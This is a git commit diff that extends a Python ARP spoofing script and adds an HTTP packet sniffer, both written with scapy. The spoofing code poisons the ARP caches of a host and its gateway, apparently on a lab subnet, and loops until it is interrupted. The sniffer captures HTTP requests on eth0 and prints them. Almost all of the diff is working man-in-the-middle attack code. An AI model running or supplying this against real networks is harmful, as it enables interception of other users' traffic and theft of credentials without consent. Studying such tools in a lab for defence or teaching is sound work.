b3f046a76c574263257eb7de9b31c3a66c43351f
ouardaoui <ayoubouardaoui3@gmail.com>
2022-06-06 19:20:56 -0400

    sniff

--- arp_spoofy/arp_spoofy.py
+++ arp_spoofy/arp_spoofy.py
@@ -6,7 +6,13 @@ import time
 def spoof(target_id,spoof_id):  
     target_mac = get_mac(target_id)
     arp_response =  scapy.ARP(op=2,psrc=spoof_id,pdst=target_id,hwdst=target_mac)
-    scapy.send(arp_response)    
+    scapy.send(arp_response,verbose=False)    
+
+def restore (source_id,dest_id) :
+    source_mac = get_mac(source_id)
+    dest_mac = get_mac(dest_id)
+    packet = scapy.ARP(op=2, psrc=source_id,hwsrc=source_mac,pdst=dest_id,hwdst=dest_mac)
+    scapy.send(packet,verbose=False,count=4)
 
 def get_mac(ip):        
     arp = scapy.ARP(pdst=ip)
@@ -15,9 +21,15 @@ def get_mac(ip):
     answered_list = scapy.srp(arp_boardcast,timeout=1,verbose=False)[0]
     return answered_list[0][1].hwsrc    
 
-while True:
-    spoof("10.0.2.4","10.0.2.1")
-    spoof("10.0.2.1","10.0.2.4")
-    time.sleep(2)
-
+try : 
+    count = 0
+    while True:
+        spoof("10.0.2.4","10.0.2.1")
+        spoof("10.0.2.1","10.0.2.4")
+        print("\r[+] packet send : "+ str(count),end="")
+        count += 2
+        time.sleep(2)
+except KeyboardInterrupt : 
+    print("\n detecting Ctrl+C....reseting ARP please waithing \n")
+    restore("10.0.2.4","10.0.2.1")  
 
---
+++ snif/snif.py
@@ -0,0 +1,12 @@
+#!/usr/bin/env python
+
+import scapy.all as scapy
+from scapy.layers import http
+
+def snif(interface): 
+    scapy.sniff(iface=interface,store=False,prn=process_packet)
+
+def process_packet(packet):
+    if packet.haslayer(http.HTTPRequest) :
+        print(packet)
+snif("eth0")
